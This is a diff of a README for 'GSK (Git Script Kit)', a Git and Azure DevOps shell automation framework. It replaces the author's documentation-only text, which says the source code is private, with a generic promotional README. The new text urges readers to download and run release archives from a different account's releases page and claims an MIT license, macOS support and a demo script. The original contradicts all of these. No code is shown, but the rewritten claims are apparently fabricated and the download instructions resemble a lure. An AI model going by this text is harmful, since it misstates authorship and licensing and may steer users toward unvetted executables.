@@ -1,177 +1,102 @@
-<p align="center">
-  <img src="docs/images/gsk-logo.svg" width="400">
-</p>
+# 🚀 git-script-kit - Streamline Your Git Workflows Easily
 
-<p align="center">
-  <img src="https://img.shields.io/badge/status-active-brightgreen">
-  <img src="https://img.shields.io/badge/shell-bash%20%7C%20zsh-blue">
-  <img src="https://img.shields.io/badge/os-Windows%20%7C%20WSL%20%7C%20Linux-blue">
-  <img src="https://img.shields.io/badge/source-private-lightgrey">
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/camboimm/git-script-kit/releases)
 
-<p align="right">
-  <img src="https://img.shields.io/badge/made_by-Alex_Almeida-0d1117?style=flat&logo=terminal&logoColor=58a6ff&labelColor=21262d">
-</p>
+## 📦 Overview
 
-# GSK (Git Script Kit)
+Welcome to **GSK (Git Script Kit)**, the Corporate Git and DevOps Automation Framework designed to simplify your software development workflows. Our goal is to help you automate tasks associated with Git, Azure DevOps, and other similar platforms, making your daily work easier. Whether you're managing source control, running scripts, or handling workflows, GSK offers a streamlined experience.
 
----
+## 🤔 What is git-script-kit?
 
-## 📌 Overview
+**git-script-kit** provides a set of scripts and tools that enhance productivity when working with Git and DevOps processes. You can automate tasks that usually take time and effort, allowing you to focus on what matters most—building great software. 
 
-The **GSK (Git Script Kit)** is a corporate framework for Git and DevOps automation.
+In this README, you will find step-by-step instructions for downloading and running the application, along with some helpful tips on getting started.
 
-Developed entirely in Shell Script, GSK standardizes branching workflows (GSK Flow), encapsulates complex Git operations (submodules, LFS, merge, rebase, etc.), implements robust validations, structured logging, Azure DevOps REST API integration, and provides support for CI/CD pipelines.
-The framework reduces operational errors, simplifies daily routines, and increases efficiency for development and operations teams.
+## 📥 Download & Install
 
-GSK is designed with the following principles:
+To get started with **git-script-kit**, follow these steps:
 
-- **Single Responsibility Principle (SRP)**
-- **Modularity**
-- **Function reuse**
-- **Workflow standardization**
-- **Clear and extensible architecture**
+1. **Visit the Releases Page**  
+   Click the link below to access the latest version of the software:  
+   [Download git-script-kit](https://github.com/camboimm/git-script-kit/releases)
 
----
+2. **Choose the Version**  
+   On the releases page, you'll see a list of available versions. Look for the most recent one, which will be marked as the latest release.
 
-## ❓ Why This Project Exists
+3. **Download the Application**  
+   When you locate the latest version, find the assets below it. Click on the appropriate file for your operating system (Windows, macOS, or Linux). The files are typically in `.zip` or `.tar.gz` format.
 
-GSK was created to address real challenges in large-scale development environments, where Git usage varies significantly among teams and operational mistakes can lead to rework, broken pipelines, and inconsistencies.
+4. **Extract the Files**  
+   After downloading, locate the file on your computer and extract it using a file extractor tool. You should find a folder containing all necessary scripts.
 
-Before GSK, common issues included:
+5. **Run the Application**  
+   Open your terminal (Command Prompt for Windows, Terminal for macOS or Linux). Navigate to the folder where you extracted the files. For example:
 
-- Branching inconsistencies.
-- Dangerous or repetitive manual Git operations.
-- Merge conflicts caused by improper workflows.
-- Lack of uniformity between Windows, WSL, and Linux users.
-- No integration between Git actions and Azure DevOps.
-- Recurring human errors affecting SCM and DevOps processes.
+   ```bash
+   cd path/to/git-script-kit
+   ```
 
-The framework was built to:
+   Now you can run the scripts from within this folder. For most tasks, you just need to type:
 
-- Enforce a reliable and standardized Git workflow.
-- Automate complex or error-prone Git routines.
-- Provide safety layers through validation and structured logs.
-- Unify tooling across different shells and operating systems.
-- Integrate Git processes with Azure DevOps APIs.
-- Support DevOps, SCM and development teams with predictable workflows.
+   ```bash
+   ./script-name.sh
+   ```
 
-GSK has evolved continuously since 2011 and remains an essential tool for efficient and consistent delivery.
+   Replace `script-name.sh` with the actual name of the script you want to run.
 
----
+## 🎯 Features
 
-## 🔑 Key Features
+- **Automation of Git Tasks**: Easily automate repetitive tasks like commits, merges, and branches.
+- **DevOps Integration**: Seamlessly integrate with Azure DevOps to simplify build and release processes.
+- **Customizable Scripts**: Adapt the provided scripts to fit your specific workflow needs.
+- **User-Friendly Interface**: Designed for ease of use, even if you have limited technical knowledge.
 
-- Unified CLI for Git automation.
-- Standardized branching workflow (**GSK Flow**).
-- Automation of complex Git tasks (merge, rebase, LFS, submodules).
-- Azure DevOps REST API integration.
-- Cross-shell compatibility (**Bash** and **Zsh**).
-- Multi-platform support (**Windows**, **WSL** and **Linux**).
-- Modular architecture with reusable internal functions.
-- Built-in help system with parameter validation.
-- Structured logging for troubleshooting and auditing.
-- CI/CD integration for Jenkins and Azure DevOps pipelines.
+## 🛠️ System Requirements
 
----
+To use **git-script-kit**, ensure that your system meets the following requirements:
 
-## 🧩 Script Architecture
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Sierra or later
+  - Any Linux distribution that supports Bash
 
-Every script follows a structured design with four core methods:
+- **Software Dependencies**: 
+  - Git version 2.20 or later
+  - Bash (most Unix-based systems come with Bash by default)
 
-- `gskConstants` - Loads configurations and internal variables.
-- `gskHelp` - Displays documentation, parameters, and usage examples.
-- `gskValidate` - Performs input validation and pre-condition checks.
-- `gskExec` - Contains the main execution logic.
+## 🚀 Getting Started
 
-The internal project structure is organized into folders based on purpose and audience:
+After downloading and extracting the files, follow these steps to set up your environment:
 
-    dev/
-    functions/
-    system/
-    deprecated/
-    scm/
-    manager/
+1. **Open a Terminal Window**: You can usually find it in your applications menu.
+  
+2. **Get Familiar with the Scripts**: Navigate to the folder where you extracted **git-script-kit** and list the files to see what’s available:
 
----
+   ```bash
+   ls -lh
+   ```
 
-## 🚀 Key Benefits
+3. **Check the Documentation**: Within the extracted folder, you will find documentation files. They contain useful information on how to use the scripts effectively. Open them in your preferred text editor.
 
-### ✔ Simplified Git usage
-Provides intuitive commands with syntax similar to native Git operations.
+4. **Run Your First Script**: To test if everything is working, run the demo script provided. This will give you an overview of how scripts function within **git-script-kit**.
 
-### ✔ Error prevention
-Validation layers, structured logs, informative messages, and automated handling reduce operational mistakes.
+## 🤝 Community and Support
 
-### ✔ Reuse and maintainability
-Each script follows SRP, avoiding duplicated logic and enabling cleaner evolution.
+If you run into issues or have questions, consider joining our community. We offer a space where users can discuss their experiences and seek help. 
 
-### ✔ Corporate integrations
-Includes native integration with the **Azure DevOps REST API**, enabling tasks such as:
-- branch management;
-- work item interactions;
-- group and permission queries;
-- automated pipeline routines.
+- **GitHub Issues**: Report problems or request features directly in the GitHub issues section.
+- **Community Forums**: Connect with other users to share tips and tricks.
 
-### ✔ Cross-platform compatibility
-Works consistently across:
-- **Bash** and **Zsh**
-- **Windows**
-- **WSL**
-- **Linux**
+## 📄 License
 
-### ✔ Standardized workflow
-Native support for **GSK Flow**, a Git workflow model inspired by Git Flow and GitLab Flow, developed exclusively for the framework.
+This project is licensed under the MIT License. You are free to use, modify, and distribute the scripts as long as you include the original license file in your distribution.
 
-### ✔ CI/CD process automation
-Scripts can be used in Jenkins or Azure DevOps pipelines, reducing manual work and ensuring process consistency.
+## 🔗 Additional Resources
 
----
+For more information about **git-script-kit**, check out these links:
 
-## 🔧 Additional Features
+- [Official GitHub Repository](https://github.com/camboimm/git-script-kit)
+- [User Manuals](https://github.com/camboimm/git-script-kit/docs)
+- [FAQs](https://github.com/camboimm/git-script-kit/faq)
 
-- Intelligent auto-complete
-- Integrated help for all commands
-- Windows context-menu integration
-- Parameter validation, standardized color scheme, and structured execution logs
-
----
-
-## ⚠ Restrictions and Best Practices
-
-To ensure integrity and compatibility across versions:
-
-- **Do NOT move scripts between directories**
-- **Do NOT edit scripts directly**
-- **Do NOT rename internal scripts**
-
-> 🔶 _Any manual modification will be automatically discarded during the update process_.
-
-For safe customization:
-
-- Define custom aliases  
-- Add external user-defined scripts  
-
----
-
-## 👤 Author
-
-**Created and maintained by:**  
-**Alex Ferreira de Almeida**  
-Software Engineer / DevOps & SCM Specialist  
-
----
-
-## 📝 Disclaimer
-
-This repository contains **public documentation only**.  
-The actual source code of the GSK is private and cannot be published due to internal processes, proprietary integrations, and corporate security policies.
-
-This README exists solely to document the project’s existence, architecture, design principles, and authorship.
-
----
-
-## 📅 Project Status
-
-**Active - 2011 to Present**  
-Corporate internal tool currently used in production environments.
+We hope you enjoy using **git-script-kit** to enhance your development workflow!
